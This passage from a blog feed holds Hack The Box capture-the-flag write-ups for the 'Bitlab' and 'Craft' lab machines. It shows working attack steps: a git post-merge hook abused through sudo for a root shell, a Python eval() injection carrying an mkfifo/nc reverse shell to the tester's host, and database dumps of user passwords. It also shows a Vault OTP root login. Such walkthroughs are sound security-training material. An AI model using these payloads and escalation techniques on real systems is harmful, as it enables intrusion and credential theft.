				-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 foo
				-rw-r--r-- 1 www-data www-data  4184 Jan 10 20:03 index.php
				drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
				-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
				</code></pre><p>We create a script named as <code>post-merge</code> inside <code>.git/hooks</code> to get a shell as root and give to it execution rights:</p>
				<pre><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ cd .git/hooks
				cd .git/hooks
				www-data@bitlab:/tmp/profile/.git/hooks$ echo 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
				&lt; 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
				www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
				chmod u+x post-merge
				</code></pre><p>Once that is done, we upload any file (doesn&rsquo;t matter) to gitlab and merge it, once that is done from inside this location we have rights, we run <code>sudo git pull</code> and with that we will be root:</p>
				<pre><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ sudo git pull
				sudo git pull
				remote: Enumerating objects: 4, done.
				remote: Counting objects: 100% (4/4), done.
				remote: Compressing objects: 100% (3/3), done.
				Unpacking objects: 100% (3/3), done.
				remote: Total 3 (delta 2), reused 0 (delta 0)
				From ssh://localhost:3022/root/profile
				35da5b2..cbbc729  master     -&gt; origin/master
				* [new branch]      patch-2    -&gt; origin/patch-8
				Updating 35da5b2..cbbc729
				Fast-forward
				1asf | 1 +
				1 file changed, 1 insertion(+)
				create mode 100644 1asf
				root@bitlab:/tmp/profile# id
				id
				uid=0(root) gid=0(root) groups=0(root)
				root@bitlab:/tmp/profile# cd /root
				cd /root
				root@bitlab:~# ls
				ls
				root.txt
				root@bitlab:~# wc -c root.txt
				wc -c root.txt
				33 root.txt
				</code></pre><p>With this we can already go to <code>/home</code> and see from there which user and it&rsquo;s respective flag.</p>
				<h2 id="beyond-root">Beyond root</h2>
				<p>Ok, as I said at the begining of the post, there are 2 paths to get this box:</p>
				<p>1 - Intended way (user -&gt; root) by doing reversing.
				2 - Taking advantage of this misconfigurations.</p>
				<p>I will go now into the 1, but I will only cover how to get user, and in the future once I know some reversing, I will post the last piece.</p>
				<h2 id="user">User</h2>
				<p>In the home page of the Profile project, there is a hint, is mentioned a connection postgresql and snippets, we go to the snippets page, and we found we have one</p>
				
				<img src="/images/htb/bitlab/1-intended_user.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>We open it and se it&rsquo;s a script to connect to the database and get a dump of profiles:</p>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
				<span style="color:#a6e22e">$db_connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
				<span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>(<span style="color:#a6e22e">$db_connection</span>, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
				</code></pre></div><p>Then, inside the profile project we add a new file with that code, but also we create an array with <code>pg_fetch_all($result)</code> in order to save all the profiles dumped, so the result is this one:</p>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
				<span style="color:#a6e22e">$db_connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
				<span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>(<span style="color:#a6e22e">$db_connection</span>, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
				<span style="color:#a6e22e">$arr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_fetch_all</span>(<span style="color:#a6e22e">$result</span>);
				<span style="color:#a6e22e">print_r</span>(<span style="color:#a6e22e">$arr</span>);
				</code></pre></div><p>After save and merge of it, we go to <code>http://10.10.10.114/profile/&lt;name you give to the script&gt;</code>, and we should get as a result printed an array with our previous user <code>clave</code> and a password:</p>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">Array ( [<span style="color:#ae81ff">0</span>] =&gt; Array ( [<span style="color:#a6e22e">id</span>] =&gt; <span style="color:#ae81ff">1</span> [<span style="color:#a6e22e">username</span>] =&gt; <span style="color:#a6e22e">clave</span> [<span style="color:#a6e22e">password</span>] =&gt; <span style="color:#a6e22e">c3NoLXN0cjBuZy1wQHNz</span><span style="color:#f92672">==</span> ) )
				</code></pre></div><p>Before trying to crack the password, we try to use as it is, and indeed it was just that one it was not encrypted!</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
				clave@10.10.10.114's password:
				Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
				clave@bitlab:~$ id
				uid=1000(clave) gid=1000(clave) groups=1000(clave)
				clave@bitlab:~$ ls -la
				total 44
				drwxr-xr-x 4 clave clave  4096 Aug  8 14:40 .
				drwxr-xr-x 3 root  root   4096 Feb 28  2019 ..
				lrwxrwxrwx 1 root  root      9 Feb 28  2019 .bash_history -&gt; /dev/null
				-rw-r--r-- 1 clave clave  3771 Feb 28  2019 .bashrc
				drwx------ 2 clave clave  4096 Aug  8 14:40 .cache
				drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg
				-rw-r--r-- 1 clave clave   807 Feb 28  2019 .profile
				-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe
				-r-------- 1 clave clave    33 Feb 28  2019 user.txt
				clave@bitlab:~$ wc -c user.txt
				33 user.txt
				</code></pre><p>We got user shell, and after listing the files in it&rsquo;s home there is an interesting .exe called <code>RemoteConnection.exe</code>, from here it will be needed to download that RemoteConnection.exe and start getting the hands dirty with some debugger to start doing reversing and see what it&rsquo;s hiding, but as I said before this will be an update in the future once I know how to do it :P.</p>
				<p>So far then we know this box has 2 ways to get root, I enjoyed quite a lot this box, and Im looking forward to do it again once I know some reversing.</p>
				<p>Until nex write up!</p>
				]]>
			</content>
		</item>
		<item>
			<title>
				Hack The Box - Craft
			</title>
			<link>
				https://pruthvirajbhat.github.io/posts/2020/01/hack-the-box-craft/
			</link>
			<pubDate>
				Sat, 04 Jan 2020 00:00:00 +0000
			</pubDate>
			<guid>
				https://pruthvirajbhat.github.io/posts/2020/01/hack-the-box-craft/
			</guid>
			<description>
				Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!
			</description>
			<content type="html">
				<![CDATA[
				<img src="/images/htb/craft/info-card.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<h2 id="quick-summary">Quick Summary</h2>
				<p>So!!
				Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot <a href="https://www.hackthebox.eu/profile/103596">@Fugl!</a>), root was easy by a little bit of enumeration and reading help command output.</p>
				<p>I had so much fun with this box trying to break in before it was going to be retired, that challenge of doing it with a few hours of deadline felt so god!</p>
				<p>Said that, let&rsquo;s start with the real write up!</p>
				<h2 id="nmap">Nmap</h2>
				<p>We start running nmap to scan for open ports and services:</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
				Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 17:21 EST
				Nmap scan report for 10.10.10.110
				Host is up (0.082s latency).
				Not shown: 998 closed ports
				PORT    STATE SERVICE  VERSION
				22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
				| ssh-hostkey:
				|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
				|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
				|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
				443/tcp open  ssl/http nginx 1.15.8
				|_http-server-header: nginx/1.15.8
				|_http-title: About
				| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
				| Not valid before: 2019-02-06T02:25:47
				|_Not valid after:  2020-06-20T02:25:47
				|_ssl-date: TLS randomness does not represent time
				| tls-alpn:
				|_  http/1.1
				| tls-nextprotoneg:
				|_  http/1.1
				No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
				TCP/IP fingerprint:
				OS:SCAN(V=7.80%E=4%D=12/23%OT=22%CT=1%CU=35537%PV=Y%DS=2%DC=I%G=Y%TM=5E013E
				OS:1F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OP
				OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
				OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
				OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
				OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
				OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
				OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
				OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
				OS:D=S)
				
				Network Distance: 2 hops
				Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
				
				OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
				Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
				</code></pre><p>We got port port 22 (SSH) and 443 (HTTPS) are open.</p>
				<h2 id="web-enumeration">Web enumeration</h2>
				<p>The home page is kind-empty, but if we position the cursor on API and the Github logo, we see at the bottom that it will redirect to <code>https://api.craft.htb</code> and <code>https://gogs.craft.htb</code>, we will add them to <code>/etc/hosts</code> pointing to the IP of craft <code>10.10.10.110</code>.</p>
				<p>
				<img src="/images/htb/craft/1-web-enum.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/craft/2-web-enum.png"  class="center"  style="border-radius: 8px;"  />
				
				</p>
				<p>Afterwards, we jump into <code>https://api.craft.htb</code> and we can see the endpoints and how to interact with them.</p>
				
				<img src="/images/htb/craft/1-api.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/craft/2-api.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/craft/3-api.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>We don&rsquo;t have at the moment any credentials to identify, so we go to <code>https://gogs.craft.htb</code> in order to see if we can find something.</p>
				
				<img src="/images/htb/craft/1-gogs.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/craft/2-gogs.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/craft/3-gogs.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>We see in explore there is a repository named <code>craft-api</code> and that the users is our gang from Silicon Valley.</p>
				<p>We jump into the repository, and start looking if we can find something.</p>
				
				<img src="/images/htb/craft/4-gogs.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>There is an issue open, so we go inside it, and there is a &ldquo;fix&rdquo;, one that Gilfoyle is not happy about it.</p>
				
				<img src="/images/htb/craft/5-gogs.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>So, there is the use of an <code>eval()</code>, that&rsquo;s something we could use to inject a command.</p>
				
				<img src="/images/htb/craft/6-gogs.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>Taking a look into the commits made by Denish, we found in the commit <code>a2d28ed155</code> that he removed hardcoded credentials, exactly the kind of things we needed:</p>
				
				<img src="/images/htb/craft/7-gogs.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<h2 id="rce">RCE</h2>
				<p>Now with credentials, knowing we could take advantage of the <code>eval()</code> and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to <code>/api/brew/</code>.
				I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use <code>test.py</code> realized about it late). grabbing the token and using it to authenticate.</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py
				#!/usr/bin/python3
				# -*- coding: utf-8 -*-
				import requests
				import re
				import json
				
				url = &quot;https://api.craft.htb/api/auth/login&quot;
				login=('dinesh', '4aUh0A8PbVJxgd')
				r = requests.get(url, auth=login, allow_redirects=False, verify=False)
				token = json.loads(r.text)['token']
				print(token)
				url = &quot;https://api.craft.htb/api/brew/&quot;
				headers = {'X-Craft-API-Token':token, 'Content-Type': 'application/json'}
				inject = &quot;&quot;&quot;__import__(&quot;os&quot;).system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f&quot;)&quot;&quot;&quot;
				payload = {&quot;name&quot;:&quot;foo&quot;,&quot;brewer&quot;:&quot;foo&quot;, &quot;style&quot;:&quot;foo&quot;, &quot;abv&quot;:inject}
				payload = json.dumps(payload)
				attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)
				</code></pre><p>In one tab run nc listening on port 4444 with <code>nc -lvp 4444</code>, and run in other tab we run the script to get the reverse:</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py
				</code></pre><pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
				listening on [any] 4444 ...
				connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
				/bin/sh: can't access tty; job control turned off
				/opt/app # whoami
				root
				/opt/app # id
				uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
				</code></pre><p>There is something weird, we are already root? we check if there is the <code>root.txt</code> in it&rsquo;s home and not, is not:</p>
				<pre><code class="language-console" data-lang="console">/opt/app # cd /root
				/root # ls -la
				total 12
				drwx------    1 root     root          4096 Feb  9  2019 .
				drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
				drwx------    1 root     root          4096 Feb  9  2019 .cache
				/root #
				</code></pre><p>So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):</p>
				<pre><code class="language-console" data-lang="console">/opt/app # ls -la /
				total 64
				drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
				drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
				-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
				drwxr-xr-x    1 root     root          4096 Feb  6  2019 bin
				drwxr-xr-x    5 root     root           340 Jan  4 20:47 dev
				drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc
				drwxr-xr-x    2 root     root          4096 Jan 30  2019 home
				drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib
				drwxr-xr-x    5 root     root          4096 Jan 30  2019 media
				drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt
				drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt
				dr-xr-xr-x  208 root     root             0 Jan  4 20:47 proc
				drwx------    1 root     root          4096 Feb  9  2019 root
				drwxr-xr-x    2 root     root          4096 Jan 30  2019 run
				drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin
				drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv
				dr-xr-xr-x   13 root     root             0 Jan  4 20:47 sys
				drwxrwxrwt    1 root     root          4096 Jan  4 20:48 tmp
				drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr
				drwxr-xr-x    1 root     root          4096 Jan 30  2019 var
				/opt/app # ls -la /usr/bin
				total 13236
				drwxr-xr-x    1 root     root          4096 Feb  9  2019 .
				drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
				lrwxrwxrwx    1 root     root             8 Feb  9  2019 2to3 -&gt; 2to3-3.6
				-rwxr-xr-x    1 root     root            95 Jan 24  2019 2to3-3.6
				lrwxrwxrwx    1 root     root            12 Feb  6  2019 [ -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 [[ -&gt; /bin/busybox
				-rwxr-xr-x    1 root     root         34944 Jan  2  2019 addr2line
				-rwxr-xr-x    2 root     root         55240 Jan  2  2019 ar
				-rwxr-xr-x    2 root     root        814672 Jan  2  2019 as
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 awk -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Feb  6  2019 basename -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 beep -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 blkdiscard -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 bunzip2 -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 bzcat -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 bzip2 -&gt; /bin/busybox
				-rwxr-xr-x    1 root     root         30440 Jan  2  2019 c++filt
				-rwxr-xr-x    1 root     root           214 Jan  3  2019 c89
				-rwxr-xr-x    1 root     root           205 Jan  3  2019 c99
				-rwxr-xr-x    1 root     root         14208 Jan 29  2019 c_rehash
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 cal -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root             3 Feb  9  2019 cc -&gt; gcc
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 chvt -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Feb  6  2019 cksum -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 clear -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 cmp -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Feb  6  2019 comm -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 cpio -&gt; /bin/busybox
				-rwxr-xr-x    1 root     root        898192 Jan  3  2019 cpp
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 crontab -&gt; /bin/busybox
				lrwxrwxrwx    1 root     root            12 Jan 30  2019 cryptpw -&gt; /bin/busybox
				</code></pre><p>Inside the directory were we started <code>/opt/app</code> we see if there is something interesting:</p>
				<pre><code class="language-console" data-lang="console">/opt/app # ls -la
				total 32
				drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
				drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
				drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
				-rw-r--r--    1 root     root            18 Feb  7  2019 .gitignore
				-rw-r--r--    1 root     root          1585 Feb  7  2019 app.py
				drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
				-rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
				drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests
				/opt/app # grep -ir '\(pass\|password\|passwd\)' *
				app.py:    flask_app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://%s:%s@%s/%s' % ( settings.MYSQL_DATABASE_USER, settings.MYSQL_DATABASE_PASSWORD, settings.MYSQL_DATABASE_HOST, settings.MYSQL_DATABASE_DB)
				craft_api/api/auth/endpoints/__pycache__/auth.cpython-36.pyc:        Create an authentication token provided valid username and password.
				craft_api/api/auth/endpoints/auth.py:        auth_results = User.query.filter(User.username == auth.username, User.password == auth.password).one()
				craft_api/api/auth/endpoints/auth.py:        Create an authentication token provided valid username and password.
				craft_api/database/models.py:    password = db.Column(db.String(80))
				craft_api/database/models.py:    def __init__(self, username, password):
				craft_api/database/models.py:        self.password = password
				craft_api/settings.py:MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
				dbtest.py:                             password=settings.MYSQL_DATABASE_PASSWORD,
				/opt/app #
				</code></pre><p>There we see we have credentials for the database, we took a deep look into <code>craft_api/settings.py</code> to see which one is the user, and it&rsquo;s <code>craft</code>, we take a look into the <code>dbtest.py</code> we found early under <code>/opt/app</code>:</p>
				<pre><code class="language-console" data-lang="console">/opt/app # cat dbtest.py
				#!/usr/bin/env python
				
				import pymysql
				from craft_api import settings
				
				# test connection to mysql database
				
				connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
				user=settings.MYSQL_DATABASE_USER,
				password=settings.MYSQL_DATABASE_PASSWORD,
				db=settings.MYSQL_DATABASE_DB,
				cursorclass=pymysql.cursors.DictCursor)
				
				try:
				with connection.cursor() as cursor:
				sql = &quot;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&quot;
				cursor.execute(sql)
				result = cursor.fetchone()
				print(result)
				
				finally:
				connection.close()
				/opt/app #
				</code></pre><p>It&rsquo;s using pymsql to interact with the database, going to the documentation of it, we see that what we need is to use the <code>method fetchall()</code>
				
				<img src="/images/htb/craft/1-rce.png"  class="center"  style="border-radius: 8px;"  />
				
				
				So, I change the script to do a <code>show tables</code> using <code>fetchall()</code> instead of <code>fetchone()</code>:</p>
				<pre><code class="language-console" data-lang="console">/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
				/opt/app # sed -i 's/result \= cursor.fetchone()/result \= cursor.fetchall()/' dbtest.py
				</code></pre><p>And post that, we ran the script, and we get 2 tables one that looks interesting named <code>user</code>, we modify again the sql query but to select all the records from that table:</p>
				<pre><code class="language-console" data-lang="console">/opt/app # python dbtest.py
				[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
				/opt/app # sed -i 's/sql \= \&quot;show tables\&quot;/sql \= \&quot;SELECT * FROM user\&quot;/' dbtest.py
				/opt/app # python dbtest.py
				[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
				/opt/app #
				</code></pre><p>So, we got the users <code>dinesh, ebachman and gilfoyle</code> and it&rsquo;s respective passwords, with that we go to <code>https://gogs.craft.htb</code> again and login as <code>gilfoyle</code> and we found that he has a private repo to deploy the infra called <code>craft-infra</code></p>
				
				<img src="/images/htb/craft/1-gil.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/craft/2-gil.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>We notice there exists a <code>.ssh</code> folder, we look into it and we get a pair of public/private ssh keys:</p>
				
				<img src="/images/htb/craft/3-gil.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>We try to login via ssh as <code>gilfoyle</code> re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
				
				
				.   *   ..  . *  *
				*  * @()Ooc()*   o  .
				(Q@*0CG*O()  ___
				|\_________/|/ _ \
				|  |  |  |  | / | |
				|  |  |  |  | | | |
				|  |  |  |  | | | |
				|  |  |  |  | | | |
				|  |  |  |  | | | |
				|  |  |  |  | \_| |
				|  |  |  |  |\___/
				|\_|__|__|_/|
				\_________/
				
				
				
				Enter passphrase for key 'id_rsa':
				Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
				
				The programs included with the Debian GNU/Linux system are free software;
				the exact distribution terms for each program are described in the
				individual files in /usr/share/doc/*/copyright.
				
				Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
				permitted by applicable law.
				Last login: Fri Jan  3 23:45:10 2020 from 10.10.14.16
				gilfoyle@craft:~$ id
				uid=1001(gilfoyle) gid=1001(gilfoyle) groups=1001(gilfoyle)
				gilfoyle@craft:~$ wc -c user.txt
				33 user.txt
				</code></pre><h2 id="root">root</h2>
				<p>We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a <code>.vault-token</code> file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to <a href="https://www.vaultproject.io/">Vault project page</a>), and try to login to vault with it which goes well.</p>
				<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ cat .vault-token
				f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ vault login
				Token (will be hidden):
				Success! You are now authenticated. The token information displayed below
				is already stored in the token helper. You do NOT need to run &quot;vault login&quot;
				again. Future Vault requests will automatically use this token.
				
				Key                  Value
				---                  -----
				token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
				token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
				token_duration       ∞
				token_renewable      false
				token_policies       [&quot;root&quot;]
				identity_policies    []
				policies             [&quot;root&quot;]
				gilfoyle@craft:~$
				</code></pre><p>We go back to the repo of <code>craft-infra</code> inside the <code>vault</code> folder to see if we can find the secret stored, in it is a small script <code>secrets.sh</code> which has exactly what we need:
				
				<img src="/images/htb/craft/4-gil.png"  class="center"  style="border-radius: 8px;"  />
				
				
				with this information we run vault to get the kv if the secret is indeed there:</p>
				<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
				========== Data ==========
				Key                  Value
				---                  -----
				allowed_users        n/a
				cidr_list            0.0.0.0/0
				default_user         root
				exclude_cidr_list    n/a
				key_type             otp
				port                 22
				</code></pre><p>We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key (<a href="https://en.wikipedia.org/wiki/One-time_password">One-Time Password</a>)
				We check what options vault provides to use it:</p>
				<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault
				Usage: vault &lt;command&gt; [args]
				
				Common commands:
				read        Read data and retrieves secrets
				write       Write data, configuration, and secrets
				delete      Delete secrets and configuration
				list        List data or secrets
				login       Authenticate locally
				agent       Start a Vault agent
				server      Start a Vault server
				status      Print seal and HA status
				unwrap      Unwrap a wrapped secret
				
				Other commands:
				audit          Interact with audit devices
				auth           Interact with auth methods
				kv             Interact with Vault's Key-Value storage
				lease          Interact with leases
				namespace      Interact with namespaces
				operator       Perform operator-specific tasks
				path-help      Retrieve API help for paths
				plugin         Interact with Vault plugins and catalog
				policy         Interact with policies
				secrets        Interact with secrets engines
				ssh            Initiate an SSH session
				token          Interact with tokens
				gilfoyle@craft:~$ vault ssh -h
				Usage: vault ssh [options] username@ip [ssh options]
				
				Establishes an SSH connection with the target machine.
				
				This command uses one of the SSH secrets engines to authenticate and
				automatically establish an SSH connection to a host. This operation requires
				that the SSH secrets engine is mounted and configured.
				
				SSH using the OTP mode (requires sshpass for full automation):
				
				$ vault ssh -mode=otp -role=my-role user@1.2.3.4
				
				SSH using the CA mode:
				
				$ vault ssh -mode=ca -role=my-role user@1.2.3.4
				
				SSH using CA mode with host key verification:
				
				$ vault ssh \
				-mode=ca \
				-role=my-role \
				-host-key-mount-point=host-signer \
				-host-key-hostnames=example.com \
				user@example.com
				
				For the full list of options and arguments, please see the documentation.
				</code></pre><p>Is clear is needed to execute something like <code>vault ssh -mode=otp -role=my-role user@1.2.3.4</code>, so we do it:</p>
				<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
				Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed
				below. Enter this code in the SSH password prompt. If you install sshpass,
				Vault can automatically perform this step for you.
				OTP for the session is: 6290d45c-541f-fb96-32c7-3e5a8aa4a256
				
				
				.   *   ..  . *  *
				*  * @()Ooc()*   o  .
				(Q@*0CG*O()  ___
				|\_________/|/ _ \
				|  |  |  |  | / | |
				|  |  |  |  | | | |
				|  |  |  |  | | | |
				|  |  |  |  | | | |
				|  |  |  |  | | | |
				|  |  |  |  | \_| |
				|  |  |  |  |\___/
				|\_|__|__|_/|
				\_________/
				
				
				
				Password:
				Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
				
				The programs included with the Debian GNU/Linux system are free software;
				the exact distribution terms for each program are described in the
				individual files in /usr/share/doc/*/copyright.
				
				Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
				permitted by applicable law.
				Last login: Sat Jan  4 00:46:56 2020 from 127.0.0.1
				root@craft:~# wc -c root.txt
